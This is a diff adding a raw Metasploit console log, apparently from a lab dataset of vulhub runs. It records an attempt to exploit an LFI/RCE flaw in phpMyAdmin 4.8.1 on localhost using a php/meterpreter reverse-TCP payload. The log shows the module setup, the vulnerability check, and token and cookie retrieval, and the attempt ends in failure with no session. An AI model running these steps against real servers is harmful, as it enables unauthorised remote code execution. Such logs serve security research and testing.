@@ -1,0 +1,41 @@
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/phpmyadmin_12613/scan3.stdout...
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> use exploit/multi/http/phpmyadmin_lfi_rce
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set RPORT 18027
+RPORT => 18027
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set LPORT 4451
+LPORT => 4451
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set TARGETURI /
+TARGETURI => /
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set SSL false
+SSL => false
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> set VERBOSE true
+VERBOSE => true
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> check
+[*] 127.0.0.1:18027 - phpMyAdmin version: 4.8.1
+[+] 127.0.0.1:18027 - The target appears to be vulnerable. The target is running a vulnerable version
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> sleep 20
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4451 
+[*] 127.0.0.1:18027 - phpMyAdmin version: 4.8.1
+[*] 127.0.0.1:18027 - Grabbing CSRF token...
+[*] 127.0.0.1:18027 - Identified Linux target
+[*] 127.0.0.1:18027 - Retrieved token |?X:ziDTBeA(Pe&h
+[*] 127.0.0.1:18027 - Retrieved cookies phpMyAdmin=ccd521efd3909fe3a916f2256bd9c881; pma_lang=en;
+[*] 127.0.0.1:18027 - Authenticating...
+[-] Exploit aborted due to failure: not-found: 127.0.0.1:18027 - Failed to retrieve webpage
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (raw/metasploit/phpmyadmin_12613/run3.rc)> spool off
